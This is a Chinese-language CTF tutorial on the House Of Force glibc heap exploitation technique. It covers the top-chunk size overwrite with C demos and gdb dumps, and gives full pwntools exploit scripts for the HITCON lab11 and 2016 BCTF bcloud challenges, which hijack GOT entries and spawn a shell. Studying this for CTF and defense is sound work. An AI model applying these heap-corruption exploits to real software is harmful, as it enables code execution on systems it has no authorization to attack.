# House Of Force

## 介绍
House Of Force 属于 House Of XXX 系列的利用方法，House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对 glibc 堆分配器的利用方法。
但是，由于年代久远《The Malloc Maleficarum》中提出的大多数方法今天都不能奏效，我们现在所指的 House Of XXX 利用相比 2004 年文章中写的已有较大的不同。但是《The Malloc Maleficarum》依然是一篇推荐阅读的文章，你可以在这里读到它的原文：
https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt

## 原理
House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆(heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：

1. 能够以溢出等方式控制到 top chunk 的 size 域
2. 能够自由地控制堆分配尺寸的大小

House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。

那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证
```
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```
然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。

```
(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
```
一般的做法是把 top chunk 的 size 改为-1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说unsigned long 中最大的数，所以无论如何都可以通过验证。

```
remainder      = chunk_at_offset(victim, nb);
av->top        = remainder;

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
```
之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。

**与此同时，我们需要注意的是，topchunk的size也会更新，其更新的方法如下**

```c
victim = av->top;
size   = chunksize(victim);
remainder_size = size - nb;
set_head(remainder, remainder_size | PREV_INUSE);
```

所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。

## 简单示例1
在学习完 HOF 的原理之后，我们这里通过一个示例来说明 HOF 的利用，这个例子的目标是通过HOF来篡改 `malloc@got.plt` 实现劫持程序流程

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 这里把top chunk的size域改为0xffffffffffffffff
    malloc(-4120);  // <=== 减小top chunk指针
    malloc(0x10);   // <=== 分配块实现任意地址写
}
```

首先，我们分配一个 0x10 字节大小的块

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk
0x602030:	0x0000000000000000	0x0000000000000000
```
之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。
因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0xffffffffffffffff <=== top chunk size域被更改
0x602030:	0x0000000000000000	0x0000000000000000
```
注意此时的 top chunk 位置，当我们进行下一次分配的时候就会更改 top chunk 的位置到我们想要的地方

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602020 <=== top chunk此时一切正常
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
接下来我们执行`malloc(-4120);`，-4120是怎么得出的呢？
首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 `malloc@got.plt` 的地址

```
0x601020:	0x00007ffff7a91130 <=== malloc@got.plt
```
所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 `malloc@got.plt` 处的内存了。

之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下

0x601010-0x602020=-4112

此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数。

```c
void *__libc_malloc(size_t bytes) {
```

如果想要用户输入的大小经过内部的 `checked_request2size`可以得到这样的大小，即

```c
/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
```

一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。

另一方面，在满足对应的约束后，我们需要使得 `request2size`正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK 恰好为-4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而**如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。**

因此，我们当调用`malloc(-4120)`之后，我们可以观察到 top chunk 被抬高到我们想要的位置

```
0x7ffff7dd1b20 <main_arena>:\	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000601010 <=== 可以观察到top chunk被抬高
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。

但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。

```c
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
```

## 简单示例2
在上一个示例中，我们演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面(低地址)的got表中的内容，
但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== 修改top chunk size
    malloc(140737345551056); <=== 增大top chunk指针
    malloc(0x10);
}
```
我们可以看到程序代码与简单示例1基本相同，除了第二次 malloc 的 size 有所不同。
这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```
可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk指针的值来实现对 malloc_hook 的写。
首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算

0x7ffff7dd1b00-0x602020-0x10=140737345551056
经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00007ffff7dd1b00 <=== top chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了

```
rax = 0x00007ffff7dd1b10
    
0x400562 <main+60>        mov    edi, 0x10
0x400567 <main+65>        call   0x400410 <malloc@plt>
```

## 小总结
在这一节中讲解了 House Of Force 的原理并且给出了两个利用的简单示例，通过观察这两个简单示例我们会发现其实HOF的利用要求还是相当苛刻的。

* 首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。
* 其次，**需要用户能自由控制 malloc 的分配大小**
* 第三，分配的次数不能受限制

其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过HOF 的方法进行利用。

## HITCON training lab 11
[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11)

这里，我们主要修改其 magic 函数为



### 基本信息

```shell
➜  hitcontraning_lab11 git:(master) file bamboobox     
bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped
➜  hitcontraning_lab11 git:(master) checksec bamboobox 
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

该程序是一个 64 位的动态链接程序。

### 基本功能

需要注意的是，该程序开始时即申请了 0x10 的内存，用来保留**两个函数指针**。

该程序大概就是对于盒子里的物品进行添加和删除

1. 展示盒子里的内容，依次盒子里每一个物品的名字。
2. 向盒子里添加物品，根据用户输入的大小来为每一个物品申请对应的内存，作为其存储名字的空间。但是需要注意的是，这里读取名字使用的是 `read` 函数，读取长度的参数是用户输入的 v2，而 read 的第三个参数是无符号整数，如果我们输入负数，就可以读取任意长度。但是我们需要确保该数值满足`REQUEST_OUT_OF_RANGE` 的约束，所以这里存在**任意长度堆溢出**的漏洞。但即使这样，第一次的时候也比较难以利用，因为初始时候堆的 top chunk 的大小一般是不会很大的。
3. 修改物品的名字，根据给定的索引，以及大小，向指定索引的物品中读取指定长度名字。这里长度由用户来读入，也存在**任意长度堆溢出**的漏洞。
4. 删除物品，将对应物品的名字的大小置为0，并将对应的 content 置为 NULL。

此外，由于该程序主要是一个演示程序，所以程序中有一个 magic 函数，可以直接读取 flag。

### 利用

由于程序中有个 magic 函数，所以我们的核心目的是覆盖某个指针为 magic 函数的指针。这里，程序在开始的时候申请了一块内存来存储两个函数指针，hello_message用于程序开始时使用，goodbye_message 用于在程序结束时使用，所以我们可以利用覆盖 goodbye_message 来控制程序执行流。具体思路如下

1. 添加物品，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。
2. 利用 house of force 技巧，分配 chunk 至堆的基地址。
3. 覆盖 goodbye_message 为magic 函数地址来控制程序执行流

**这里需要注意的是，在触发top chunk 转移到指定位置时，所使用的大小应该合适，以便于设置新的 top chunk 大小，从而可以绕过下一次分配top chunk 的检测。**

exp 如下

```shell
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./bamboobox')
context.log_level = 'debug'


def additem(length, name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def modify(idx, length, name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


def show():
    r.recvuntil(":")
    r.sendline("1")


magic = 0x400d49
# we must alloc enough size, so as to successfully alloc from fake topchunk
additem(0x30, "ddaa")  # idx 0
payload = 0x30 * 'a'  # idx 0's content
payload += 'a' * 8 + p64(0xffffffffffffffff)  # top chunk's prev_size and size
# modify topchunk's size to -1
modify(0, 0x41, payload)
# top chunk's offset to heap base
offset_to_heap_base = -(0x40 + 0x20)
malloc_size = offset_to_heap_base - 0x8 - 0xf
#gdb.attach(r)
additem(malloc_size, "dada")
additem(0x10, p64(magic) * 2)
print r.recv()
r.interactive()

```

当然，这一题也可以使用 unlink 的方法来做。

## 2016 BCTF bcloud
[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud)

### 基本信息

```shell
➜  2016_bctf_bcloud git:(master) file bcloud   
bcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped
➜  2016_bctf_bcloud git:(master) checksec bcloud  
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出，这是一个动态链接的 32 位程序，主要开启了 Canary 保护与 NX 保护。

### 基本功能

程序大概是一个云笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。程序主要有以下几个功能

1. 新建note，根据用户的输入x申请x+4的空间作为note的大小。
2. 展示note，啥功能也没有。。
3. 编辑note，根据用户指定的 note 编辑对应的内容。
4. 删除note，删除对应note。
5. 同步note，标记所有的note已经被同步。

然而在这五个功能中并没有发现啥漏洞，，，重新看程序，结果发现程序在初始化的时候出现了漏洞。。

初始化名字

```c
unsigned int init_name()
{
  char s; // [esp+1Ch] [ebp-5Ch]
  char *tmp; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&s, 0, 0x50u);
  puts("Input your name:");
  read_str(&s, 64, '\n');
  tmp = (char *)malloc(0x40u);
  name = tmp;
  strcpy(tmp, &s);
  info(tmp);
  return __readgsdword(0x14u) ^ v3;
}
```

这里如果程序读入的名字为64个字符，那么当程序在使用info函数输出对应的字符串时，就会输出对应的tmp指针内容，也就是说**泄露了堆的地址**。。

初始化组织和org的时候存在漏洞

```c
unsigned int init_org_host()
{
  char s; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  char v3; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(&s, 0, 0x90u);
  puts("Org:");
  read_str(&s, 64, 10);
  puts("Host:");
  read_str(&v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  org = v2;
  host = v4;
  strcpy(v4, &v3);
  strcpy(v2, &s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

当读入组织时，给定 64 字节，会覆盖 v2 的低地址。与此同时，我们可以知道 v2 是与 top chunk 相邻的 chunk，而 v2 恰好与 org 相邻，那么由于在 32 位程序中，一般都是 32 位全部都使用，这里 v2 所存储的内容，几乎很大程度上都不是 `\x00` ，所以当执行 strcpy 函数向 v2 中拷贝内容时，很有可能会覆盖top chunk。这就是漏洞所在。

### 利用

1. 利用初始化名字处的漏洞泄漏堆的基地址。。
2. 利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &notesize-8 处，当再次申请内存时，便返回notesize地址处的内存，从而我们就可以控制所有note的大小以及对应的地址了。
3. 修改前三个 note 的大小为16，并修改其指针为 free@got，atoi@got，atoi@got
4. 将 free@got 修改为 puts@plt。
5. 泄漏 atoi 地址。
6. 再次修改另外一个 atoi got 项为 system 地址，从而拿到shell。

具体脚本如下

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./bcloud"
bcloud = ELF("./bcloud")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./bcloud")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


def exp():
    # leak heap base
    p.sendafter('Input your name:\n', 'a' * 64)
    p.recvuntil('Hey ' + 'a' * 64)
    # sub name's chunk' s header
    heap_base = u32(p.recv(4)) - 8
    log.success('heap_base: ' + hex(heap_base))
    p.sendafter('Org:\n', 'a' * 64)
    p.sendlineafter('Host:\n', p32(0xffffffff))
    # name,org,host, for each is (0x40+8)
    topchunk_addr = heap_base + (0x40 + 8) * 3

    # make topchunk point to 0x0804B0A0-8
    p.sendlineafter('option--->>', '1')
    notesize_addr = 0x0804B0A0
    notelist_addr = 0x0804B120
    targetaddr = notesize_addr - 8
    offset_target_top = targetaddr - topchunk_addr
    # 4 for size_t, 7 for malloc_allign
    malloc_size = offset_target_top - 4 - 7
    # plus 4 because malloc(v2 + 4);
    p.sendlineafter('Input the length of the note content:\n',
                    str(malloc_size - 4))
    # most likely malloc_size-4<0...
    if malloc_size - 4 > 0:
        p.sendlineafter('Input the content:\n', '')

    #gdb.attach(p)
    # set notesize[0] = notesize[1] = notesize[2]=16
    # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got
    p.sendlineafter('option--->>', '1')
    p.sendlineafter('Input the length of the note content:\n', str(1000))

    payload = p32(16) * 3 + (notelist_addr - notesize_addr - 12) * 'a' + p32(
        bcloud.got['free']) + p32(bcloud.got['atoi']) * 2
    p.sendlineafter('Input the content:\n', payload)

    # overwrite free@got with puts@plt
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(0))
    p.sendlineafter('Input the new content:\n', p32(bcloud.plt['puts']))

    # leak atoi addr by fake free
    p.sendlineafter('option--->>', '4')
    p.sendlineafter('Input the id:\n', str(1))
    atoi_addr = u32(p.recv(4))
    libc_base = atoi_addr - libc.symbols['atoi']
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base addr: ' + hex(libc_base))

    # overwrite atoi@got with system
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(2))
    p.sendlineafter('Input the new content:\n', p32(system_addr))

    # get shell
    p.sendlineafter('option--->>', '/bin/sh\x00')
    p.interactive()


if __name__ == "__main__":
    exp()
```



## 题目

- [2016 Boston Key Party CTF cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6)
